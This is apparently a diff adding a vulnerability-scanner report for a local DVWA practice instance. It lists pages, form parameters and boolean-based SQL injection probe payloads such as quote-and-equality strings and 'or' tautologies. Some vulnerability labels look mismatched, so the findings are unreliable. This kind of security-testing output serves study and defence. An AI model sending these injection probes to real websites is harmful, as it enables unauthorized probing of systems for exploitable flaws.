@@ -1,0 +1,62 @@
+Target: http://localhost/dvwa/ (GET)
+
+---
+URL:http://localhost/dvwa/vulnerabilities/csrf/ (GET)
+VulnName: 
+Query: {'password_new': 'cntvalue', 'password_current': 'cntvalue', 'password_conf': 'cntvalue', 'Change': 'Change', 'user_token': 'abe06bcb6844e93eda72a9dd336a5371'}
+Payload: '+and+'17581'='17581
+'+and+'90509'='90509
+'+or+14045=14045#
+'+and+'73844'='73845
+Advice: 
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/exec/ (POST)
+VulnName: blind sqli
+Query: {'ip': 'cntvalue', 'Submit': 'Submit', 'user_token': '38c7874e196ab83923c2818766dc854d'}
+Payload: +and+87750=87750
++and+44900=44900
++or+23381=23381#
++and+1500=1501
+Advice: use orm
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/xss_r/ (GET)
+VulnName: 
+Query: {'user_token': 'b10be0b60820137ec251f0bf008c8539', 'name': 'cntvalue'}
+Payload: "+and+"25334"="25334
+"+and+"19381"="19381
+"+or+35661=35661#
+"+and+"69572"="69573
+Advice: 
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/sqli/ (GET)
+VulnName: 
+Query: {'user_token': '1d643bf2be8ffdc8155cadcf50a76395', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: +and+87750=87750
++and+44900=44900
++or+23381=23381#
++and+1500=1501
+Advice: 
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/sqli_blind/ (GET)
+VulnName: blind sqli
+Query: {'user_token': '30eb4e52de9b4acf714a89a83985ec57', 'id': 'cntvalue', 'Submit': 'Submit'}
+Payload: "+and+"25334"="25334
+"+and+"19381"="19381
+"+or+35661=35661#
+"+and+"69572"="69573
+Advice: use orm
+Database: unknown
+---
+URL:http://localhost/dvwa/vulnerabilities/brute/ (POST)
+VulnName: blind sqli
+Query: {'username': 'cntvalue', 'user_token': 'b1a12e486defebf715e47ba4fb4c7c33', 'Login': 'Login', 'password': 'cntvalue'}
+Payload: '	and	'18888'='18888
+'	and	'64008'='64008
+'	or	10573=10573#
+'	and	'76399'='76400
+Advice: use orm
+Database: unknown
